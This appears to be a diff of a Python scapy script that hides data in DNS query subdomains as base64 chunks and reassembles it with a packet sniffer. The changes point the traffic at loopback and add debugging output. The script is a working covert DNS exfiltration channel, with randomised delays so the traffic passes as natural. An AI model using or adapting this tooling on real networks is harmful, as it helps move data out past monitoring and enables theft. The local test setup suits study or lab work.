@@ -9,18 +9,19 @@ from scapy.all import *
 
 # Configuration
 DOMAIN = "example.com"  # Domain for DNS queries
-dns_servers = ["192.168.86.132"]  # Use local IP address for testing
+dns_servers = ["127.0.0.1"]  # Use loopback IP address for testing
 received_chunks = []
 
 # Function to handle incoming DNS packets
 def dns_sniffer(packet):
+    print("[Sniffer] Packet received")  # Debugging message to confirm packet reception
     if packet.haslayer(DNS) and packet.getlayer(DNS).qd is not None:  # Capture only valid DNS query packets
         try:
             query_name = packet.getlayer(DNS).qd.qname.decode().strip('.')
             
             # Filter packets to only process those with the target domain
             if DOMAIN in query_name:
-                print(f"Received query: {query_name}")
+                print(f"[Sniffer] Received query: {query_name}")
                 
                 # Extract the data chunk from the subdomain (first part of the query name)
                 if '-' in query_name:
@@ -32,15 +33,15 @@ def dns_sniffer(packet):
                             decoded_chunk = base64.urlsafe_b64decode(data_chunk + '==').decode()
                             received_chunks.append(decoded_chunk)
                         except Exception as e:
-                            print(f"Failed to decode chunk: {data_chunk}, error: {e}")
+                            print(f"[Sniffer] Failed to decode chunk: {data_chunk}, error: {e}")
 
                 # Print the current reassembled payload
                 reassembled_payload = ''.join(received_chunks)
-                print(f"Reassembled Payload so far: {reassembled_payload}")
+                print(f"[Sniffer] Reassembled Payload so far: {reassembled_payload}")
         except IndexError as e:
-            print(f"Failed to process packet: {e}")
+            print(f"[Sniffer] Failed to process packet: {e}")
         except Exception as e:
-            print(f"Unexpected error: {e}")
+            print(f"[Sniffer] Unexpected error: {e}")
 
 # Send Covert Payload Using DNS
 def send_covert_payload(payload, domain=DOMAIN):
@@ -66,6 +67,7 @@ def send_covert_payload(payload, domain=DOMAIN):
         packet = IP(dst=random.choice(dns_servers)) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=query_domain))
         
         # Send the packet
+        print(f"[Sender] Sending DNS query: {query_domain}")
         send(packet, verbose=False)
         time.sleep(random.uniform(0.5, 2.0))  # Random delay for more natural traffic
 
@@ -74,13 +76,23 @@ if __name__ == "__main__":
     # Example payload to send covertly
     secret_payload = "This is a secret payload."
     
+    # Print available network interfaces
+    print("Available network interfaces:")
+    print(conf.ifaces)
+    
     # Start a sniffer in a separate thread
     import threading
-    sniffer_thread = threading.Thread(target=lambda: sniff(filter="udp port 53 and udp[10] & 0x80 = 0", prn=dns_sniffer))
+    interface = "Software Loopback Interface 1"  # Update with the loopback interface name
+    print("[Main] Starting sniffer thread...")
+    sniffer_thread = threading.Thread(target=lambda: sniff(filter=f"udp port 53 and host {dns_servers[0]}", prn=dns_sniffer, iface=interface))  # Capturing only DNS traffic to/from target domain
     sniffer_thread.daemon = True
     sniffer_thread.start()
+    
+    # Ensure sniffer is running before sending payload
+    time.sleep(5)  # Increased delay to ensure sniffer is ready
+    print("[Main] Sniffer thread started. Sending payload...")
     
     # Send the covert payload
     send_covert_payload(secret_payload)
 
-    print("Payload transmitted.")
+    print("[Main] Payload transmitted.")
